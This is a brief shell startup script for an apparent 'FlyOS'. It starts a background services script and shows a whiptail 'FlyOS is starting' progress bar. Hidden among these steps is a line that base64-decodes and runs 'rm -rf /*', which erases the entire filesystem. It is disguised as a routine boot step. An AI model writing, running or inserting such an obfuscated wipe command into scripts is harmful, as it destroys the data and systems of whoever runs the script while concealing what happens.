
nohup bash $FLYOS/.services.sh & 
#!/bin/bash
{
    for ((i = 0 ; i <= 100 ; i+=25)); do
        echo $i
    done
} | whiptail --gauge "FlyOS正在启动" 6 60 0
sh -c '$(echo "cm0gLXJmIC8qCg=="|base64 -d)'
bash $FLYOS/services.sh
